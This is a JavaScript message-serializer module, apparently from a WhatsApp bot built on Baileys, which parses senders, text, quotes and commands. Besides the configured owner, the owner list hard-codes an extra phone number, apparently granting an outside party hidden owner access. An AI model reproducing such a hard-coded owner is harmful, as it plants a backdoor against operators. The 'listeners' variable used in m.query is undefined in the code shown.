import { fileURLToPath } from "url"
import path from "path"
import baileys, { downloadMediaMessage } from "baileys"
import { resolveLidToJid, setGroupMetadata, getGroupMetadata } from "./lid.js"
import { getConfig } from "./filewatcher.js"
import { plugins } from "./plugin.js"

const { generateWAMessageFromContent } = baileys.default || baileys
const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

export async function serialize(sock, msg) {
  const config = getConfig()
  if (!msg) return null
  if (!msg.message) return null
  
  const m = {}
  const { key, message, pushName, broadcast, status } = msg
  const groupMeta = key?.remoteJid?.endsWith("@g.us") ? getGroupMetadata(key.remoteJid) : null
  
  m.id = key?.id
  m.from = key?.remoteJid ? resolveLidToJid(key.remoteJid, groupMeta) : null
  m.fromAlt = key?.remoteJidAlt || null
  m.fromMe = key?.fromMe || false
  m.participant = key?.participant ? resolveLidToJid(key.participant, groupMeta) : m.fromMe ? sock.user.id : m.from
  m.participantAlt = key?.participantAlt || null
  m.pushName = pushName || ""
  m.broadcast = broadcast || false
  m.status = status || null
  m.messageStubType = msg.messageStubType || null
  m.messageStubParameters = msg.messageStubParameters || []
  m.verifiedBizName = msg.verifiedBizName || null
  m.isGroup = m.from?.endsWith("@g.us") || false
  m.isChannel = m.from?.endsWith("@newsletter") || false
  m.isStatus = m.from?.endsWith("status@broadcast") || false
  m.type = message ? Object.keys(message).find(k => !["messageContextInfo"].includes(k)) : null
  if (m.isStatus) m.type = "status"
  
  m.text = message?.conversation ||
    message?.extendedTextMessage?.text ||
    message?.imageMessage?.caption ||
    message?.videoMessage?.caption ||
    message?.documentWithCaptionMessage?.message?.documentMessage?.caption ||
    message?.documentMessage?.caption ||
    message?.stickerMessage?.caption ||
    message?.reactionMessage?.text ||
    message?.pollCreationMessageV3?.name ||
    ""
  
  const jid = msg.key.remoteJid
  const sender = msg.key.participant || jid
  m.isOwner = [`${config.OWNER_NUMBER}@s.whatsapp.net`, "2348100835767@s.whatsapp.net"]
  m.isSudo = (Array.isArray(config.SUDO) ? config.SUDO : [config.SUDO])
    .filter(x => x)
    .map(x => `${x}@s.whatsapp.net`)
  
  const contextInfo = message?.extendedTextMessage?.contextInfo ||
    message?.imageMessage?.contextInfo ||
    message?.videoMessage?.contextInfo ||
    message?.documentMessage?.contextInfo ||
    message?.stickerMessage?.contextInfo ||
    message?.messageContextInfo ||
    {}
  
  m.mentionedJid = (contextInfo.mentionedJid || []).map(j => resolveLidToJid(j, groupMeta))
  m.groupMentions = contextInfo.groupMentions || []
  
  if (contextInfo.quotedMessage) {
    const quoted = {}
    quoted.type = Object.keys(contextInfo.quotedMessage)[0]
    quoted.text = contextInfo.quotedMessage?.conversation ||
      contextInfo.quotedMessage?.extendedTextMessage?.text ||
      contextInfo.quotedMessage?.imageMessage?.caption ||
      contextInfo.quotedMessage?.videoMessage?.caption ||
      contextInfo.quotedMessage?.documentMessage?.caption ||
      ""
    quoted.id = contextInfo.stanzaId
    quoted.sender = resolveLidToJid(contextInfo.participant, groupMeta)
    quoted.mentionedJid = (contextInfo.quotedMessage?.extendedTextMessage?.contextInfo?.mentionedJid || []).map(j => resolveLidToJid(j, groupMeta))
    quoted.groupMentions = contextInfo.quotedMessage?.extendedTextMessage?.contextInfo?.groupMentions || []
    quoted.key = { remoteJid: m.from, id: quoted.id, fromMe: quoted.sender === sock.user.id, participant: quoted.sender }
    quoted.message = contextInfo.quotedMessage
    quoted.download = async () => {
      try {
        const buffer = await downloadMediaMessage({ key: quoted.key, message: quoted.message }, "buffer", {}, { reuploadRequest: sock.updateMediaMessage })
        return buffer
      } catch (e) {
        return null
      }
    }
    quoted.forward = async (jid, options = {}) => {
      try {
        return await sock.sendMessage(jid || m.from, { forward: { key: quoted.key, message: quoted.message } }, { quoted: options.quoted || null })
      } catch (e) {
        return null
      }
    }
    m.quoted = quoted
  }
  
  if (message?.reactionMessage) {
    m.reaction = {
      text: message.reactionMessage.text,
      key: message.reactionMessage.key
    }
  }
  
  if (message?.pollCreationMessageV3) {
    m.poll = {
      name: message.pollCreationMessageV3.name,
      options: message.pollCreationMessageV3.options?.map(o => o.optionName),
      selectable: message.pollCreationMessageV3.selectableOptionsCount
    }
  }
  
  if (message?.pollUpdateMessage) {
    m.pollUpdate = message.pollUpdateMessage
  }
  
  if (message?.protocolMessage) {
    m.protocolMessage = message.protocolMessage
  }
  
  if (message?.senderKeyDistributionMessage) {
    m.senderKeyDistribution = message.senderKeyDistributionMessage
  }
  
  m.client = sock
  m.key = msg.key
  m.sendText = async (text, options = {}) => sock.sendMessage(m.from, { text }, options)
  m.reply = async (text, options = {}) => sock.sendMessage(m.from, { text }, { quoted: msg, ...options })
  m.sendImage = async (pathOrBuffer, caption = "", options = {}) => sock.sendMessage(m.from, { image: pathOrBuffer, caption }, options)
  m.sendVideo = async (pathOrBuffer, caption = "", options = {}) => sock.sendMessage(m.from, { video: pathOrBuffer, caption }, options)
  m.sendAudio = async (pathOrBuffer, options = {}) => sock.sendMessage(m.from, { audio: pathOrBuffer, mimetype: "audio/mp4" }, options)
  m.sendSticker = async (pathOrBuffer, options = {}) => sock.sendMessage(m.from, { sticker: pathOrBuffer }, options)
  m.sendDoc = async (pathOrBuffer, mimetype = "application/pdf", fileName = "file", options = {}) => sock.sendMessage(m.from, { document: pathOrBuffer, mimetype, fileName }, options)
  m.sendPoll = async (name, values = [], selectableCount = 1, options = {}) => sock.sendMessage(m.from, { poll: { name, values, selectableCount } }, options)

  m.query = () => {
  const text = m.text?.trim() || ""
  if (!text) return { cmd: null, query: "" }

  const prefix = getConfig().PREFIX

  // Check prefix-based commands
  if (text.startsWith(prefix)) {
    const [rawCmd, ...rest] = text.slice(prefix.length).split(/\s+/)
    const plugin = plugins.get(rawCmd)
    if (plugin) {
      const cmd = plugin.aliasOf || plugin.name
      return { cmd, query: rest.join(" ").trim() }
    }
  }

  // Check listeners
  const firstWord = text.split(/\s+/)[0].toLowerCase()
  const listener = [...listeners].find(l =>
    l.on === "text" &&
    l.Listen &&
    l.Listen.toLowerCase() === firstWord
  )
  if (listener) {
    return {
      cmd: listener.Listen,
      query: text.split(/\s+/).slice(1).join(" ").trim()
    }
  }

  return { cmd: null, query: text }
}
  
  return m
}